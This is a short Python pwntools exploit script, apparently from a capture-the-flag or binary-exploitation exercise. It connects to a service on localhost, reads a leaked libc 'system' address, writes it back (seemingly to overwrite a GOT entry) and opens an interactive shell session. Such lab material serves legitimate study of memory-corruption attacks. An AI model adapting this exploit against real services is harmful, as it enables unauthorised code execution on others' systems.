#!/usr/bin/python
from pwn import *
import sys
# context.log_level = 'debug'

addr = "127.0.0.1"
port = 1234
if len(sys.argv)>1:
    port = int(sys.argv[1])

p = remote(addr,port)
# p = process('./got')

system = u64(p.recv(8))
log.info("system@libc: " + hex(system))

p.sendline(p64(system))
p.interactive()
